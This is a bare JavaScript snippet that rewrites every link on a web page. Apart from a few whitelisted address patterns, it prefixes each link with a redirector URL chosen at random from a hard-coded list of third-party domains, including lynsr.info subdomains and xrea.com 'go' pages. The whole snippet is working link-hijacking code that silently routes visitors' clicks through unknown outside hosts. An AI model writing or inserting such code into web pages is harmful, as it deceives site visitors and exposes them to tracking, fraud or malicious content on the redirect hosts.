var links = document.links;
for (var i=0, iLen=links.length; i<iLen; i++) {
var threads = ['https://wwe.lynsr.info/?', 'https://blog.musz.info/?', 'http://faketaxi.s602.xrea.com/go/?', 'http://dymusz.s1007.xrea.com/go/?', 'https://red.lynsr.info/?', 'https://amy.lynsr.info/?', 'http://yomi.s2.xrea.com/go/?', 'http://jas.s5.xrea.com/go/?', 'http://poi.s27.xrea.com/go/?', 'http://bvp.s105.xrea.com/go/?', 'http://tum2wp.s1003.xrea.com/go/?', 'http://loh.s37.xrea.com/go/?'];  
var random  = threads[Math.floor(Math.random() * threads.length)];
var hrefer = document.links[i].href;
if(hrefer.match("av.a") || hrefer.match("ojjoio")|| hrefer.match("ce.a")|| hrefer.match("ce.n")|| hrefer.match("ja.a")|| hrefer.match("xx.m")) {
document.links[i].href = document.links[i].href; 
 }else{links[i].href = random + links[i].href;}
 }
